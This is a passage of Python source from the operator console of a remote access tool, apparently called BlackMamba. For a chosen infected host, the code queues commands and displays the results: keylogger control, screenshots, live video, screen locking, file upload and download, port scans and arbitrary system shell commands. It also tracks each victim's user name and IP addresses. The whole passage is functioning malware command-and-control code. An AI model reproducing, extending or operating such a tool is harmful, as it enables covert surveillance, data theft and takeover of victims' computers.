            print(int(fsize))

            try:
                self.system_terminal.setStyleSheet(f'font-size: {int(fsize)}px;')
                with open('bin/profile/st_size.txt', 'w') as hss:
                    hss.write(fsize)
            except:
                pass

            return

        with open(f'bin/request/transfer/stdin/{self.hselected}', 'w') as new_task:
            try:
                if btn_scr:
                    new_task.write(f'%get-screenshot%')

                elif str(self.lineEdit.displayText()).startswith('-fget'):
                    new_task.write(str(self.lineEdit.displayText()))

                elif str(self.lineEdit.displayText()).startswith('-fput'):
                    new_task.write(str(self.lineEdit.displayText()))

                elif rec_start:
                    new_task.write(f'%rcstr%')

                elif wget:
                    new_task.write(wget)

                elif wraw:
                    new_task.write(wraw)

                elif upd:
                    new_task.write('-update')

                elif port:
                    new_task.write(self.port_scan)

                elif ant:
                    new_task.write('-antivirus')

                elif soft_list:
                    new_task.write(f'@%list-softwares%@')

                elif kl_print:
                    new_task.write(f'%print-kl-function%')

                elif kl_start:
                    new_task.write(f'%start-kl-function%')

                elif kl_stop:
                    new_task.write(f'%stop-kl-function%')

                elif st_strm:
                    new_task.write(f'%sv-init-live-video%')

                elif sclk:
                    new_task.write(f'%lock-screen%')

                elif sculk:
                    new_task.write(f'%unlock-screen%')

                else:
                    new_task.write(f'[SYSTEM_SHELL]{str(self.lineEdit.displayText())}')

            except:
                pass
                return
            new_task.close()

        if btn_scr or sclk or sculk or coordinates or rec_start or rec_stop or rec_get \
                or st_strm or live_video:
            with open(f'bin/request/transfer/execute/{self.hselected}', 'w') as new_task:
                new_task.write('True')
                new_task.close()
                return

        self.lineEdit.clear()
        threadd = threading.Thread(target=self.shell_control, args=())
        threadd.daemon = True
        threadd.start()
        time.sleep(0.1)

    def shell_control(self):
        with open(f'bin/request/transfer/execute/{self.hselected}', 'w') as new_task:
            new_task.write('True')
            new_task.close()

        for e in range(60):
            with open(f'bin/request/transfer/stdout/{self.hselected}', "r") as f:
                ctim = f.read()
            if ctim == "":
                time.sleep(1)
                continue
            elif e == 45:
                time_out = True
                break

            else:
                break

        try:
            if time_out:
                return
        except:
            pass

        with open(f'bin/request/transfer/stdout/{self.hselected}', 'r') as get_output:
            command_output = get_output.read()
            get_output.close()

        print(f'stdout -> {command_output}')

        if command_output == '' or command_output == ' ' or command_output == 'None' or command_output == 'NoneNone' \
                or command_output == b'' or command_output == 'b""' or command_output == "b''":

            with open(f'bin/request/transfer/stdout/{self.hselected}', 'w') as get_output:
                get_output.write('')
                get_output.close()
            return

        get_the_stdout = command_output
        get_the_stdout = get_the_stdout.replace("b' ", "")
        get_the_stdout = get_the_stdout.replace("b'", "")
        rmp2 = get_the_stdout[-1:]

        if rmp2 == "'" or rmp2 == '"':
            get_the_stdout = get_the_stdout.replace(rmp2, "")

        get_the_stdout = get_the_stdout.replace('\\n', '\n')

        if get_the_stdout.startswith('b"') or get_the_stdout.startswith("b'"):
            get_the_stdout = get_the_stdout.replace('b"','')
            get_the_stdout = get_the_stdout.replace("b'",'')

        if get_the_stdout == 'None' or get_the_stdout == None or get_the_stdout == 'NoneNone' or get_the_stdout == "None":
            return

        if '[@%HOST_SHELL%@]' in get_the_stdout:
            get_the_stdout = get_the_stdout.replace('[@%HOST_SHELL%@]', '')
            old_content = self.host_terminal.text()

            if old_content == '' or old_content == ' ':
                self.host_terminal.setText(get_the_stdout)

            else:
                self.host_terminal.setText(old_content + '\n' + get_the_stdout)

            with open(f'bin/request/transfer/stdout/{self.hselected}', 'w') as clear_file:
                clear_file.write('')
                clear_file.close()

            return

        old_content = self.system_terminal.text()

        if old_content == '' or old_content == ' ':
            self.system_terminal.setText(get_the_stdout)

        else:
            self.system_terminal.setText(old_content + '\n' + get_the_stdout)

        with open(f'bin/request/transfer/stdout/{self.hselected}', 'w') as clear_file:
            clear_file.write('')
            clear_file.close()

    def clear_lineEdit(self):
        self.lineEdit.clear()

    def retranslateUi(self, MainWindow):
        with open(f'bin/hosts/{self.hselected}.txt', 'r') as get_info:
            info_host = get_info.read().split('\n')

            print(info_host)
            get_info.close()

        for search_info in info_host:
            if 'uname:' in search_info:
                self.name_host = search_info.replace('uname:', '')

            elif 'external_ip' in search_info:
                self.external_ip = search_info.replace('external_ip:', '')

            elif 'local_ip' in search_info:
                self.local_ip = search_info.replace('local_ip:', '')

        MainWindow.setWindowTitle(QCoreApplication.translate("MainWindow", u"MainWindow", None))
        self.label_title_bar_top.setText(QCoreApplication.translate("MainWindow", f"{self.name_host}", None))
#if QT_CONFIG(tooltip)
        self.btn_minimize.setToolTip(QCoreApplication.translate("MainWindow", u"Minimize", None))
#endif // QT_CONFIG(tooltip)
        self.btn_minimize.setText("")
#if QT_CONFIG(tooltip)
        self.btn_maximize_restore.setToolTip(QCoreApplication.translate("MainWindow", u"Maximize", None))
#endif // QT_CONFIG(tooltip)
        self.btn_maximize_restore.setText("")
#if QT_CONFIG(tooltip)
        self.btn_close.setToolTip(QCoreApplication.translate("MainWindow", u"Close", None))
#endif // QT_CONFIG(tooltip)
        self.btn_close.setText("")
        self.label_top_info_1.setText(QCoreApplication.translate("MainWindow", u"{HOST_IP}", None))
        self.label_6.setText(QCoreApplication.translate("MainWindow", u"HOME", None))
        self.label.setText(QCoreApplication.translate("MainWindow", u"Empyt Page - By: Wanderson M. Pimenta", None))
        self.label_7.setText(QCoreApplication.translate("MainWindow", u"Page Index 0", None))
        #self.shell_host.setPlainText("")
        self.lineEdit.setPlaceholderText("")
        self.toolButton_4.setText(QCoreApplication.translate("MainWindow", u"...", None))
        self.toolButton.setText(QCoreApplication.translate("MainWindow", u"...", None))
        self.toolButton_2.setText(QCoreApplication.translate("MainWindow", u"...", None))
        #self.toolButton_8.setText("")
        self.toolButton_3.setText(QCoreApplication.translate("MainWindow", u"...", None))
        self.toolButton_5.setText("")
        #self.toolButton_6.setText("")
        #self.toolButton_9.setText(QCoreApplication.translate("MainWindow", u"...", None))
        #self.label_2.setText(QCoreApplication.translate("MainWindow", u"00:00:00", None))
        self.lineEdit_2.setPlaceholderText("")
        #self.toolButton_7.setText("")
        #self.toolButton_10.setText("")
        #self.toolButton_11.setText("")
        self.label_credits.setText(QCoreApplication.translate("MainWindow", u"BlackMamba by Loseys", None))
        self.label_version.setText(QCoreApplication.translate("MainWindow", u"v1.0.41", None))
    # retranslateUi
